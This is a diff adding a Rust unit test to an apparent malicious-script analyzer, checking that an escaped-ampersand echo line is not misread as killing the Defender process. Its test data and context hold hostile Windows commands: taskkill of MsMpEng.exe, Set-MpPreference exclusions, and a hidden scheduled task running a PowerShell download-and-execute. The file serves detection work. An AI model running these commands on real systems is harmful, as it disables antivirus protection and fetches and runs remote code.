@@ -3486,6 +3486,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn escaped_ampersand_taskkill_text_does_not_emit_defender_evasion() {
+        let script = br#"echo keep ^& taskkill /im MsMpEng.exe /f"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "taskkill-security-process" && target == "MsMpEng.exe"
+            )),
+            "escaped ampersand echo text was misread as taskkill Defender evasion: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn set_mppreference_exclusions_emit_defender_evasion_traits() {
         let script = br#"powershell -Command "Set-MpPreference -ExclusionPath 'C:\Users\Public' -ExclusionProcess calc.exe"
 "#;
